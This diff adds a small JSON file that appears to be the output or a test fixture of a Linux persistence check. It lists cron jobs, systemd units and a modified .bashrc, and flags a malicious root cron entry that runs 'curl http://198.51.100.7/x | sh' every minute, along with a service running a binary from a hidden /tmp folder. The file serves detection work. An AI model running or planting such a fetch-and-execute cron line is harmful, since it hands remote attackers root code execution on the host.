@@ -1,0 +1,15 @@
+{
+  "check": "persistence",
+  "tools_missing": [],
+  "cron": [
+    { "path": "/etc/cron.daily/logrotate", "mtime": "2026-04-10 12:00:00", "owner": "root", "sha256": "bbbb2222" },
+    { "path": "/etc/cron.d/update-check", "mtime": "2026-05-22 03:14:07", "owner": "root", "sha256": "9f2cdead", "content_excerpt": "* * * * * root curl -s http://198.51.100.7/x | sh" }
+  ],
+  "systemd": [
+    { "unit": "ssh.service", "state": "enabled" },
+    { "unit": "helper-agent.service", "state": "enabled", "exec_start": "/tmp/.x/agent" }
+  ],
+  "shell_rc": [
+    { "path": "/home/dev/.bashrc", "mtime": "2026-05-22 03:14:55", "note": "modified minutes after the suspicious cron entry" }
+  ]
+}
